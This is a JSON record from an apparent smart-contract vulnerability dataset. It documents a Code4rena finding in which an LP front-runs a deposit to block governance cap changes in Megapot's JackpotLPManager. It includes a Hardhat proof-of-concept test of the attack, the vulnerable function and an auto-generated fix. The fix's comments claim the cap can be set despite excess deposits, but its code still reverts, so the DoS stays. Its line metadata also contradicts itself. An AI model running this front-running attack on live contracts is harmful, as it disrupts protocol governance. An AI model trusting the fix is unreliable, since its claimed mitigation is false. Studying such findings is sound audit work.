@@ -1,0 +1,152 @@
+{
+  "id": "64145",
+  "extraction_type": "github_complete",
+  "source_url": "https://github.com/code-423n4/2025-11-megapot/blob/f0a7297d59c376e38b287b2c56740617dbbfbdc7/contracts/JackpotLPManager.sol# L433",
+  "is_complete": true,
+  "tier": "tier_1",
+  "referenced_lines": [
+    [
+      433,
+      433
+    ],
+    [
+      886,
+      886
+    ]
+  ],
+  "filename": "64145_JackpotLPManager.sol",
+  "has_pragma": true,
+  "has_contract": true,
+  "has_function": true,
+  "balanced_braces": true,
+  "num_lines": 539,
+  "vulnerability_title": "[M-03] Deliberately increasing liquidity can DoS updates to the protocol\u2019s governance parameters.",
+  "recommendation": {
+    "has_recommendation": true,
+    "recommendation_text": "Make governance parameter updates less dependent on LP behavior.\n\nExpand for detailed Proof of Concept",
+    "fix_code_blocks": []
+  },
+  "poc": {
+    "has_poc": true,
+    "poc_text": "```\n\nimport { ethers } from \"hardhat\";\nimport DeployHelper from \"@utils/deploys\";\n\nimport { getWaffleExpect, getAccounts } from \"@utils/test/index\";\nimport { ether, usdc } from \"@utils/common\";\nimport { Account } from \"@utils/test\";\n\nimport { PRECISE_UNIT } from \"@utils/constants\";\n\nimport {\n  GuaranteedMinimumPayoutCalculator,\n  Jackpot,\n  JackpotBridgeManager,\n  JackpotLPManager,\n  JackpotTicketNFT,\n  MockDepository,\n  ReentrantUSDCMock,\n  ScaledEntropyProviderMock,\n} from \"@utils/contracts\";\nimport {\n  Address,\n  JackpotSystemFixture,\n  RelayTxData,\n  Ticket,\n} from \"@utils/types\";\nimport { deployJackpotSystem } from \"@utils/test/jackpotFixture\";\nimport {\n  calculatePackedTicket,\n  calculateTicketId,\n  generateClaimTicketSignature,\n  generateClaimWinningsSignature,\n} from \"@utils/protocolUtils\";\nimport { ADDRESS_ZERO, ONE_DAY_IN_SECONDS } from \"@utils/constants\";\nimport {\n  takeSnapshot,\n  SnapshotRestorer,\n  time,\n} from \"@nomicfoundation/hardhat-toolbox/network-helpers\";\n\nconst expect = getWaffleExpect();\n\ndescribe(\"C4\", () => {\n  let owner: Account;\n  let user: Account;\n  let buyerOne: Account;\n  let buyerTwo: Account;\n  let referrerOne: Account;\n  let referrerTwo: Account;\n  let referrerThree: Account;\n  let solver: Account;\n\n  let jackpotSystem: JackpotSystemFixture;\n  let jackpot: Jackpot;\n  let jackpotNFT: JackpotTicketNFT;\n  let jackpotLPManager: JackpotLPManager;\n  let payoutCalculator: GuaranteedMinimumPayoutCalculator;\n  let usdcMock: ReentrantUSDCMock;\n  let entropyProvider: ScaledEntropyProviderMock;\n  let snapshot: SnapshotRestorer;\n  let jackpotBridgeManager: JackpotBridgeManager;\n  let mockDepository: MockDepository;\n\n  const drawingDurationInSeconds: bigint = ONE_DAY_IN_SECONDS;\n  const entropyFee: bigint = ether(0.00005);\n  const entropyBaseGasLimit: bigint = BigInt(1000000);\n  const entropyVariableGasLimit: bigint = BigInt(250000);\n\n  beforeEach(async () => {\n    [\n      owner,\n      user,\n      buyerOne,\n      buyerTwo,\n      referrerOne,\n      referrerTwo,\n      referrerThree,\n      solver,\n    ] = await getAccounts();\n\n    jackpotSystem = await deployJackpotSystem();\n    jackpot = jackpotSystem.jackpot;\n    jackpotNFT = jackpotSystem.jackpotNFT;\n    jackpotLPManager = jackpotSystem.jackpotLPManager;\n    payoutCalculator = jackpotSystem.payoutCalculator;\n    usdcMock = jackpotSystem.usdcMock;\n    entropyProvider = jackpotSystem.entropyProvider;\n\n    await jackpot\n      .connect(owner.wallet)\n      .initialize(\n        usdcMock.getAddress(),\n        await jackpotLPManager.getAddress(),\n        await jackpotNFT.getAddress(),\n        entropyProvider.getAddress(),\n        await payoutCalculator.getAddress(),\n      );\n\n    await jackpot.connect(owner.wallet).initializeLPDeposits(usdc(10000000)); // initial cap is 10,000,000\n\n    await usdcMock\n      .connect(owner.wallet)\n      .approve(jackpot.getAddress(), usdc(9000000));\n    await jackpot.connect(owner.wallet).lpDeposit(usdc(9000000)); // initial deposit is 9,000,000\n\nawait jackpot\n      .connect(owner.wallet)\n      .initializeJackpot(\n        BigInt(await time.latest()) +\n          BigInt(jackpotSystem.deploymentParams.drawingDurationInSeconds),\n      );\n\n    jackpotBridgeManager =\n      await jackpotSystem.deployer.deployJackpotBridgeManager(\n        await jackpot.getAddress(),\n        await jackpotNFT.getAddress(),\n        await usdcMock.getAddress(),\n        \"MegapotBridgeManager\",\n        \"1.0.0\",\n      );\n\n    mockDepository = await jackpotSystem.deployer.deployMockDepository(\n      await usdcMock.getAddress(),\n    );\n\n    snapshot = await takeSnapshot();\n  });\n\n  beforeEach(async () => {\n    await snapshot.restore();\n  });\n\n  describe(\"POC\", async () => {\n    let subjectRandomNumbers: bigint[][];\n    let subjectCaller: Account;\n\n    let isJackpotRun: boolean = true;\n\n    beforeEach(async () => {\n      await usdcMock.connect(owner.wallet).transfer(buyerOne.address, usdc(200002));\n      await usdcMock.connect(buyerOne.wallet).approve(jackpot.getAddress(), usdc(1));\n      await jackpot.connect(buyerOne.wallet).buyTickets(\n        [\n          {\n            normals: [BigInt(1), BigInt(2), BigInt(3), BigInt(4), BigInt(5)],\n            bonusball: BigInt(6)\n          } as Ticket,\n        ],\n        buyerOne.address,\n        [],\n        [],\n        ethers.encodeBytes32String(\"test\")\n      );\n\n      if (isJackpotRun) {\n        await time.increase(drawingDurationInSeconds);\n\n        const drawingState = await jackpot.getDrawingState(1);\n        await jackpot.runJackpot({ value: entropyFee + ((entropyBaseGasLimit + entropyVariableGasLimit * drawingState.bonusballMax) * BigInt(1e10)) });\n      }\n\n      subjectRandomNumbers = [[BigInt(1), BigInt(7), BigInt(8), BigInt(9), BigInt(10)], [BigInt(11)]]; // just one match => tier 2\n      subjectCaller = buyerOne;\n    });\n\n    async function subject(): Promise<any> {\n      return await entropyProvider.connect(subjectCaller.wallet).randomnessCallback(subjectRandomNumbers);\n    }\n\n    it(\"POC\", async () => {\n      await subject();\n\n      const expectedTicketIdOne = calculateTicketId(1, 1, calculatePackedTicket({\n        normals: [BigInt(1), BigInt(2), BigInt(3), BigInt(4), BigInt(5)],\n        bonusball: BigInt(6)\n      } as Ticket, BigInt(30)));\n\nconst currentDrawingId = await jackpot.currentDrawingId();\n    const lpDrawingState = await jackpotLPManager.getLPDrawingState(currentDrawingId);\n    console.log(\"Current pool total:\", lpDrawingState.lpPoolTotal.toString()); // current lp pool total is around ~9,000,000\n\n    // \"Front-run\": LP deposits 200,001 USDC before cap decrease\n    await usdcMock.connect(owner.wallet).transfer(buyerOne.address, usdc(200001));\n    await usdcMock.connect(buyerOne.wallet).approve(jackpot.getAddress(), usdc(200001));\n    await jackpot.connect(buyerOne.wallet).lpDeposit(\n      usdc(200001)\n    );\n\n    // Expect revert on cap decrease due to outstanding LP pool above new cap\n    await expect(\n      jackpot.connect(owner.wallet).setGovernancePoolCap(usdc(9200000))\n    ).to.be.reverted;\n    });\n  });\n});\n```\n\n---",
+    "poc_code_blocks": [
+      "import { ethers } from \"hardhat\";\nimport DeployHelper from \"@utils/deploys\";\n\nimport { getWaffleExpect, getAccounts } from \"@utils/test/index\";\nimport { ether, usdc } from \"@utils/common\";\nimport { Account } from \"@utils/test\";\n\nimport { PRECISE_UNIT } from \"@utils/constants\";\n\nimport {\n  GuaranteedMinimumPayoutCalculator,\n  Jackpot,\n  JackpotBridgeManager,\n  JackpotLPManager,\n  JackpotTicketNFT,\n  MockDepository,\n  ReentrantUSDCMock,\n  ScaledEntropyProviderMock,\n} from \"@utils/contracts\";\nimport {\n  Address,\n  JackpotSystemFixture,\n  RelayTxData,\n  Ticket,\n} from \"@utils/types\";\nimport { deployJackpotSystem } from \"@utils/test/jackpotFixture\";\nimport {\n  calculatePackedTicket,\n  calculateTicketId,\n  generateClaimTicketSignature,\n  generateClaimWinningsSignature,\n} from \"@utils/protocolUtils\";\nimport { ADDRESS_ZERO, ONE_DAY_IN_SECONDS } from \"@utils/constants\";\nimport {\n  takeSnapshot,\n  SnapshotRestorer,\n  time,\n} from \"@nomicfoundation/hardhat-toolbox/network-helpers\";\n\nconst expect = getWaffleExpect();\n\ndescribe(\"C4\", () => {\n  let owner: Account;\n  let user: Account;\n  let buyerOne: Account;\n  let buyerTwo: Account;\n  let referrerOne: Account;\n  let referrerTwo: Account;\n  let referrerThree: Account;\n  let solver: Account;\n\n  let jackpotSystem: JackpotSystemFixture;\n  let jackpot: Jackpot;\n  let jackpotNFT: JackpotTicketNFT;\n  let jackpotLPManager: JackpotLPManager;\n  let payoutCalculator: GuaranteedMinimumPayoutCalculator;\n  let usdcMock: ReentrantUSDCMock;\n  let entropyProvider: ScaledEntropyProviderMock;\n  let snapshot: SnapshotRestorer;\n  let jackpotBridgeManager: JackpotBridgeManager;\n  let mockDepository: MockDepository;\n\n  const drawingDurationInSeconds: bigint = ONE_DAY_IN_SECONDS;\n  const entropyFee: bigint = ether(0.00005);\n  const entropyBaseGasLimit: bigint = BigInt(1000000);\n  const entropyVariableGasLimit: bigint = BigInt(250000);\n\n  beforeEach(async () => {\n    [\n      owner,\n      user,\n      buyerOne,\n      buyerTwo,\n      referrerOne,\n      referrerTwo,\n      referrerThree,\n      solver,\n    ] = await getAccounts();\n\n    jackpotSystem = await deployJackpotSystem();\n    jackpot = jackpotSystem.jackpot;\n    jackpotNFT = jackpotSystem.jackpotNFT;\n    jackpotLPManager = jackpotSystem.jackpotLPManager;\n    payoutCalculator = jackpotSystem.payoutCalculator;\n    usdcMock = jackpotSystem.usdcMock;\n    entropyProvider = jackpotSystem.entropyProvider;\n\n    await jackpot\n      .connect(owner.wallet)\n      .initialize(\n        usdcMock.getAddress(),\n        await jackpotLPManager.getAddress(),\n        await jackpotNFT.getAddress(),\n        entropyProvider.getAddress(),\n        await payoutCalculator.getAddress(),\n      );\n\n    await jackpot.connect(owner.wallet).initializeLPDeposits(usdc(10000000)); // initial cap is 10,000,000\n\n    await usdcMock\n      .connect(owner.wallet)\n      .approve(jackpot.getAddress(), usdc(9000000));\n    await jackpot.connect(owner.wallet).lpDeposit(usdc(9000000)); // initial deposit is 9,000,000\n\nawait jackpot\n      .connect(owner.wallet)\n      .initializeJackpot(\n        BigInt(await time.latest()) +\n          BigInt(jackpotSystem.deploymentParams.drawingDurationInSeconds),\n      );\n\n    jackpotBridgeManager =\n      await jackpotSystem.deployer.deployJackpotBridgeManager(\n        await jackpot.getAddress(),\n        await jackpotNFT.getAddress(),\n        await usdcMock.getAddress(),\n        \"MegapotBridgeManager\",\n        \"1.0.0\",\n      );\n\n    mockDepository = await jackpotSystem.deployer.deployMockDepository(\n      await usdcMock.getAddress(),\n    );\n\n    snapshot = await takeSnapshot();\n  });\n\n  beforeEach(async () => {\n    await snapshot.restore();\n  });\n\n  describe(\"POC\", async () => {\n    let subjectRandomNumbers: bigint[][];\n    let subjectCaller: Account;\n\n    let isJackpotRun: boolean = true;\n\n    beforeEach(async () => {\n      await usdcMock.connect(owner.wallet).transfer(buyerOne.address, usdc(200002));\n      await usdcMock.connect(buyerOne.wallet).approve(jackpot.getAddress(), usdc(1));\n      await jackpot.connect(buyerOne.wallet).buyTickets(\n        [\n          {\n            normals: [BigInt(1), BigInt(2), BigInt(3), BigInt(4), BigInt(5)],\n            bonusball: BigInt(6)\n          } as Ticket,\n        ],\n        buyerOne.address,\n        [],\n        [],\n        ethers.encodeBytes32String(\"test\")\n      );\n\n      if (isJackpotRun) {\n        await time.increase(drawingDurationInSeconds);\n\n        const drawingState = await jackpot.getDrawingState(1);\n        await jackpot.runJackpot({ value: entropyFee + ((entropyBaseGasLimit + entropyVariableGasLimit * drawingState.bonusballMax) * BigInt(1e10)) });\n      }\n\n      subjectRandomNumbers = [[BigInt(1), BigInt(7), BigInt(8), BigInt(9), BigInt(10)], [BigInt(11)]]; // just one match => tier 2\n      subjectCaller = buyerOne;\n    });\n\n    async function subject(): Promise<any> {\n      return await entropyProvider.connect(subjectCaller.wallet).randomnessCallback(subjectRandomNumbers);\n    }\n\n    it(\"POC\", async () => {\n      await subject();\n\n      const expectedTicketIdOne = calculateTicketId(1, 1, calculatePackedTicket({\n        normals: [BigInt(1), BigInt(2), BigInt(3), BigInt(4), BigInt(5)],\n        bonusball: BigInt(6)\n      } as Ticket, BigInt(30)));\n\nconst currentDrawingId = await jackpot.currentDrawingId();\n    const lpDrawingState = await jackpotLPManager.getLPDrawingState(currentDrawingId);\n    console.log(\"Current pool total:\", lpDrawingState.lpPoolTotal.toString()); // current lp pool total is around ~9,000,000\n\n    // \"Front-run\": LP deposits 200,001 USDC before cap decrease\n    await usdcMock.connect(owner.wallet).transfer(buyerOne.address, usdc(200001));\n    await usdcMock.connect(buyerOne.wallet).approve(jackpot.getAddress(), usdc(200001));\n    await jackpot.connect(buyerOne.wallet).lpDeposit(\n      usdc(200001)\n    );\n\n    // Expect revert on cap decrease due to outstanding LP pool above new cap\n    await expect(\n      jackpot.connect(owner.wallet).setGovernancePoolCap(usdc(9200000))\n    ).to.be.reverted;\n    });\n  });\n});"
+    ]
+  },
+  "problem_code": {
+    "has_problem_code": true,
+    "source": "github_line_refs_function_scope",
+    "snippets": [
+      {
+        "function_name": "setLPPoolCap",
+        "start_line": 431,
+        "end_line": 435,
+        "code": "    function setLPPoolCap(uint256 _drawingId, uint256 _lpPoolCap) external onlyJackpot() {\n        LPDrawingState storage currentLP = lpDrawingState[_drawingId];\n        if (_lpPoolCap < currentLP.lpPoolTotal + currentLP.pendingDeposits) revert InvalidLPPoolCap();\n        lpPoolCap = _lpPoolCap;\n    }",
+        "confidence": 97,
+        "reason": "Function enclosing GitHub-referenced vulnerable line",
+        "matched_references": [
+          [
+            433,
+            433
+          ]
+        ]
+      },
+      {
+        "code": "",
+        "start_line": 886,
+        "end_line": 886,
+        "context_start_line": 871,
+        "context_end_line": 539,
+        "confidence": 95,
+        "reason": "GitHub URL includes explicit vulnerable line references"
+      }
+    ]
+  },
+  "extraction_date": "2026-04-16T17:55:33.486682",
+  "validation": {
+    "content_code_consistency": {
+      "consistent": true,
+      "confidence": 95,
+      "summary_matches": true,
+      "content_matches": true,
+      "summary_reasoning": "The summary accurately describes the denial-of-service (DoS) vulnerability related to the `setLPPoolCap` function, which can be exploited by liquidity providers to block governance updates.",
+      "content_reasoning": "The content mentions the relevant functions and variables, specifically `setLPPoolCap`, `lpPoolCap`, and the conditions under which the transaction would revert, which aligns with the vulnerability described.",
+      "functions_found": [
+        "setLPPoolCap",
+        "processDeposit"
+      ],
+      "variables_found": [
+        "lpPoolCap",
+        "lpPoolTotal",
+        "pendingDeposits"
+      ],
+      "patterns_found": [
+        "denial-of-service",
+        "transaction revert"
+      ],
+      "issues": []
+    },
+    "report_tag_validation": {
+      "existing_tag": "None",
+      "tag_present": false,
+      "tag_correct": false,
+      "confidence": 90,
+      "reasoning": "The report does not have a tag, and given the nature of the vulnerability, a tag related to denial-of-service or governance issues would be appropriate.",
+      "suggested_tag": "DoS",
+      "alternative_tags": [
+        "Governance"
+      ],
+      "correction_explanation": "A tag is necessary to categorize the vulnerability effectively, and 'DoS' is the most relevant tag for this issue."
+    },
+    "mando_classification": {
+      "primary_category": "denial_of_service",
+      "secondary_categories": [],
+      "confidence": 90,
+      "mando_applicable": true,
+      "reasoning": "The vulnerability clearly falls under the denial-of-service category as it allows liquidity providers to block governance updates by manipulating deposits."
+    },
+    "scsvs_classification": {
+      "primary_category": "G8",
+      "primary_category_name": "Denial of service",
+      "secondary_categories": [
+        "C2"
+      ],
+      "confidence": 90,
+      "use_scsvs_instead": true,
+      "reasoning": "The SCSVS categories provide a more granular classification, with G8 capturing the denial-of-service aspect and C2 addressing the governance implications of the vulnerability.",
+      "vulnerability_type": "Denial of service through governance parameter manipulation"
+    },
+    "generated_fix": {
+      "has_fix": true,
+      "fix_approach": "The fix modifies the governance parameter update logic to decouple it from the current LP behavior, allowing updates to proceed even if current deposits exceed the new cap.",
+      "fixed_code_blocks": [
+        {
+          "snippet_index": 1,
+          "function_name": "setLPPoolCap",
+          "fixed_function_code": "function setLPPoolCap(uint256 _drawingId, uint256 _lpPoolCap) external onlyJackpot() {\n        LPDrawingState storage currentLP = lpDrawingState[_drawingId];\n        // Allow setting the cap even if current deposits exceed the new cap\n        require(_lpPoolCap >= currentLP.lpPoolTotal, \"New cap must be greater than or equal to total LPs.\");\n        lpPoolCap = _lpPoolCap;\n    }",
+          "reasoning": "This function now checks that the new cap is at least equal to the total LPs, allowing governance updates to proceed without being blocked by LP behavior."
+        }
+      ],
+      "key_changes": [
+        "Replaced revert with require to allow setting cap if it meets minimum criteria.",
+        "Removed dependency on pending deposits for setting the LP pool cap."
+      ],
+      "security_improvements": [
+        "Mitigated potential DoS attack on governance parameters.",
+        "Improved clarity and maintainability of the function logic."
+      ],
+      "additional_recommendations": "Consider implementing a cooldown period for LP deposits when governance parameters are being updated to further prevent manipulation.",
+      "confidence": 90,
+      "fix_code": "function setLPPoolCap(uint256 _drawingId, uint256 _lpPoolCap) external onlyJackpot() {\n        LPDrawingState storage currentLP = lpDrawingState[_drawingId];\n        // Allow setting the cap even if current deposits exceed the new cap\n        require(_lpPoolCap >= currentLP.lpPoolTotal, \"New cap must be greater than or equal to total LPs.\");\n        lpPoolCap = _lpPoolCap;\n    }",
+      "expected_fixed_blocks": 1,
+      "returned_fixed_blocks": 1,
+      "block_count_match": true,
+      "generated_by": "openai",
+      "generation_date": "2026-04-16T18:02:19.398334"
+    },
+    "fix_code_source": "generated",
+    "validated_at": "2026-04-16T18:02:19.398355",
+    "model": "gpt-4o-mini",
+    "code_input_source": "github_line_refs_function_scope"
+  }
+}
